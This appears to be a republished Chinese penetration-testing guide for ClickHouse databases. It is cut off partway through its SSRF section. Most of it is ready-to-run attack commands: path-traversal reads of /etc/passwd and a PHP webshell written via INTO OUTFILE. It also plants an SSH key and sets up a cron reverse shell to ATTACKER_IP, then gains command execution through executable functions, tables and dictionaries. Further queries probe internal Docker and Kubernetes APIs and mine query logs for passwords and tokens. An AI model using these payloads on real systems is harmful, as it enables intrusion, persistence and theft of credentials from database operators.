---
title: ClickHouse 数据库渗透测试指南
url: https://mp.weixin.qq.com/s/JG3luvhVInqn4z7ZJ_rf7w
source: Doonsec's feed
date: 2026-07-26
fetch_date: 2026-07-27T05:40:00.260903
---

# ClickHouse 数据库渗透测试指南

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/MSDUaqtwboSRK4jo4ibicPt3P5KYcrpjhibul5hp1Pdpjj4F9HCdFU008CIb7Zl7Owsdibgzc5OJTEXQfwuHicGhD2RWFGynuLVeic4iaiakB8icZXO0/0?wx_fmt=jpeg)

# ClickHouse 数据库渗透测试指南

SecurityPaper
SecurityPaper

陌笙不太懂安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

免责声明

```
由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号陌笙不太懂安全及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉，谢谢！
```

```
原文作者:SecurityPaper原创链接:https://xz.aliyun.com/news/91297
```

## 目录

```
概述信息收集权限评估文件读取利用文件写入利用命令执行利用SSRF 利用云环境利用横向移动防御绕过常见限制与绕过工具与脚本
```

## 概述

##

### 什么是 ClickHouse

ClickHouse 是由 Yandex 开发的开源列式数据库管理系统，专为在线分析处理（OLAP）场景设计。它能够高效处理大规模数据集，支持快速查询和实时数据分析。

### 默认配置

|  |  |
| --- | --- |
| 配置项 | 默认值 |
| HTTP 端口 | 8123 |
| TCP 端口 | 9000 |
| MySQL 协议端口 | 9004 |
| 配置目录 | /etc/clickhouse-server/ |
| 数据目录 | /var/lib/clickhouse/ |
| 用户脚本目录 | /var/lib/clickhouse/user\_scripts/ |
| 用户文件目录 | /var/lib/clickhouse/user\_files/ |

### 渗透测试目标

1. **信息泄露**：获取敏感数据、配置信息
2. **文件读取**：读取系统敏感文件
3. **文件写入**：写入 webshell、脚本、配置文件
4. **命令执行**：实现 RCE（远程代码执行）
5. **横向移动**：利用 SSRF 或数据库连接攻击内网

---

## 信息收集

### 1. 版本信息

```
-- 获取版本SELECT version();
-- 获取详细版本信息SELECT * FROM system.build_options;
```

### 2. 用户与权限

```
-- 当前用户SELECT currentUser();
-- 查看所有用户SELECT * FROM system.users;
-- 查看当前用户权限SHOW GRANTS;
-- 查看所有权限授予SELECT * FROM system.grants;
-- 查看角色SELECT * FROM system.roles;SELECT * FROM system.role_grants;
```

### 3. 数据库与表

```
-- 查看所有数据库SHOW DATABASES;
-- 查看所有表SELECT database, name, engine, total_rows, total_bytes FROM system.tables WHERE database NOT IN ('system', 'INFORMATION_SCHEMA', 'information_schema')ORDER BY total_bytes DESC;
-- 查看表结构DESCRIBE TABLE database_name.table_name;
```

### 4. 服务器配置

```
-- 查看所有设置SELECT name, value FROM system.settings;-- 查看路径相关配置SELECT name, value FROM system.settings WHERE name LIKE '%path%';-- 查看文件相关配置SELECT name, value FROM system.settings WHERE name LIKE '%file%';-- 查看可执行相关配置SELECT name, value FROM system.settings WHERE name LIKE '%executable%';-- 查看磁盘信息SELECT * FROM system.disks;-- 查看存储策略SELECT * FROM system.storage_policies;
```

### 5. 集群信息

```
-- 查看集群配置SELECT * FROM system.clusters;
-- 查看 Zookeeper 配置SELECT * FROM system.zookeeper WHERE path = '/';
-- 查看复制表状态SELECT * FROM system.replicas;
-- 查看宏定义SELECT * FROM system.macros;
```

### 6. 查询历史（敏感信息）

```
-- 查看查询日志（可能包含密码、密钥）SELECT     event_time,    user,    query,    client_hostnameFROM system.query_log WHERE type = 'QueryFinish' ORDER BY event_time DESC LIMIT 100;
-- 搜索包含敏感关键词的查询SELECT query FROM system.query_log WHERE query LIKE '%password%'    OR query LIKE '%secret%'    OR query LIKE '%key%'   OR query LIKE '%token%';
```

### 7. 可用函数

```
-- 查看所有表函数SELECT name FROM system.table_functions ORDER BY name;
-- 查看用户定义函数SELECT name, origin, create_query FROM system.functions WHERE origin = 'ExecutableUserDefined';
-- 查看所有非系统函数SELECT name, origin FROM system.functions WHERE origin != 'System';
```

## 权限评估

### 关键权限检查

```
-- 检查是否有文件写入权限SELECT * FROM system.settings WHERE name = 'allow_into_outfile';
-- 检查是否有 DDL 权限SELECT * FROM system.settings WHERE name = 'allow_ddl';
-- 检查 SOURCES 权限（url、mysql、postgresql 等函数）SHOW GRANTS;-- 查找是否有 SOURCES 权限
```

### 权限等级

|  |  |
| --- | --- |
| 权限级别 | 可执行操作 |
| 只读用户 | SELECT 查询 |
| 普通用户 | SELECT、INSERT、部分表函数 |
| DDL 权限 | CREATE、DROP、ALTER |
| SOURCES 权限 | url()、mysql()、postgresql() 等 |
| 管理员 | 全部权限 |

---

## 文件读取利用

##

### 1. file() 函数读取

```
-- 基本读取（限制在 user_files 目录）SELECT * FROM file('test.txt', 'RawBLOB', 'data String');
-- 使用通配符列出文件SELECT * FROM file('*', 'RawBLOB', 'data String');SELECT * FROM file('*.txt', 'RawBLOB', 'data String');SELECT * FROM file('*.log', 'RawBLOB', 'data String');
```

### 2. 路径穿越（低版本可能有效）

```
-- 尝试路径穿越SELECT * FROM file('../../../etc/passwd', 'RawBLOB', 'data String');SELECT * FROM file('../../etc/passwd', 'RawBLOB', 'data String');SELECT * FROM file('....//....//....//etc/passwd', 'RawBLOB', 'data String');
-- 读取 ClickHouse 配置SELECT * FROM file('../config.xml', 'RawBLOB', 'data String');SELECT * FROM file('../users.xml', 'RawBLOB', 'data String');
```

### 3. 软链接绕过（需要命令执行权限）

如果有命令执行权限，可以创建软链接绕过目录限制：

```
ln -s /etc/passwd /var/lib/clickhouse/user_files/passwd
```

然后读取：

```
SELECT * FROM file('passwd', 'RawBLOB', 'data String');
```

## 文件写入利用

### 1. INTO OUTFILE

```
-- 基本文件写入SELECT 'test content' INTO OUTFILE '/path/to/file.txt' FORMAT Raw;
-- 使用 TRUNCATE 覆盖文件SELECT 'new content' INTO OUTFILE '/path/to/file.txt' TRUNCATE FORMAT Raw;
-- 写入 webshellSELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' FORMAT Raw;
-- 写入 SSH 公钥SELECT 'ssh-rsa AAAA... user@host' INTO OUTFILE '/root/.ssh/authorized_keys' FORMAT Raw;
-- 写入 crontabSELECT '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/8888 0>&1' INTO OUTFILE '/etc/cron.d/reverse_shell' FORMAT Raw;
```

### 2. 写入脚本到 user\_scripts 目录

```
-- 写入可执行脚本SELECT '#!/bin/bashid' INTO OUTFILE '/var/lib/clickhouse/user_scripts/cmd.sh' FORMAT Raw;
-- 写入交互式 shell 脚本SELECT '#!/bin/bashwhile read cmd; do    eval "$cmd" 2>&1done' INTO OUTFILE '/var/lib/clickhouse/user_scripts/shell.sh' FORMAT Raw;
```

## 命令执行利用

### 方法1：UDF 配置文件（需要配置文件写入权限）

**步骤1：创建 UDF 配置文件**

创建 `/etc/clickhouse-server/cmd_function.xml`：

```
<functions>    <function>        <type>executable</type>        <name>cmd</name>        <return_type>String</return_type>        <format>TabSeparated</format>        <command>id</command>        <execute_direct>0</execute_direct>        <lifetime>0</lifetime>    </function></functions>
```

**关键参数说明：**

* `execute_direct=0`：command 通过 `sh -c` 执行

* `execute_direct=1`：command 在 user\_scripts 目录查找脚本

**步骤2：确保 config.xml 包含**

```
<user_defined_executable_functions_config>*_function.xml</user_defined_executable_functions_config>
```

**步骤3：重启服务后执行**

```
SELECT cmd();
```

### 方法2：带参数的交互式 Shell

**UDF 配置：**

```
<functions>    <function>        <type>executable</type>        <name>shell</name>        <return_type>String</return_type>        <argument>            <type>String</type>            <name>cmd</name>        </argument>        <format>TabSeparated</format>        <command>bash -c</command>        <execute_direct>0</execute_direct>        <lifetime>0</lifetime>    </function></functions>
```

**执行命令：**

```
SELECT shell('id');SELECT shell('cat /etc/passwd');SELECT shell('whoami');
```

### 方法3：executable() 表函数

```
-- 直接执行命令（新版本）SELECT * FROM executable('id', TabSeparated, 'output String');SELECT * FROM executable('cat /etc/passwd', TabSeparated, 'line String');
-- 执行 user_scripts 目录下的脚本SELECT * FROM executable('script.sh', TabSeparated, 'output String');
-- 带参数执行SELECT * FROM executable('shell.sh', TabSeparated, 'output String', (SELECT 'id'));
```

### 方法4：Executable 表引擎

```
-- 创建 Executable 表CREATE TABLE cmd_table (output String) ENGINE = Executable('id', TabSeparated);
-- 查询触发执行SELECT * FROM cmd_table;
```

### 方法5：Executable Dictionary

```
-- 创建可执行字典CREATE DICTIONARY cmd_dict (    id UInt64,    output String)PRIMARY KEY idSOURCE(EXECUTABLE(COMMAND 'id' FORMAT TabSeparated))LIFETIME(0)LAYOUT(FLAT());
-- 调用字典执行命令SELECT dictGet('cmd_dict', 'output', toUInt64(1));
```

## SSRF 利用

### 1. url() 表函数

```
-- 基本 HTTP 请求SELECT * FROM url('http://target:port/path', 'RawBLOB', 'data String');
-- 带超时设置SELECT * FROM url('http://target:port/', 'RawBLOB', 'data String') SETTINGS connect_timeout=2, receive_timeout=2;
-- 探测内网服务SELECT * FROM url('http://192.168.1.1:80/', 'RawBLOB', 'd String');SELECT * FROM url('http://10.0.0.1:8080/', 'RawBLOB', 'd String');SELECT * FROM url('http://172.16.0.1:3306/', 'RawBLOB', 'd String');
```

### 2. 常见内网服务探测

```
-- RedisSELECT * FROM url('http://127.0.0.1:6379/', 'RawBLOB', 'd String');
-- ElasticsearchSELECT * FROM url('http://127.0.0.1:9200/', 'RawBLOB', 'd String');
-- Docker APISELECT * FROM url('http://127.0.0.1:2375/version', 'RawBLOB', 'd String');SELECT * FROM url('http://127.0.0.1:2375/containers/json', 'RawBLOB', 'd String');
-- Kubernetes APISELECT * FROM url('http://127.0.0.1:10250/pods', 'RawBLOB', 'd Stri...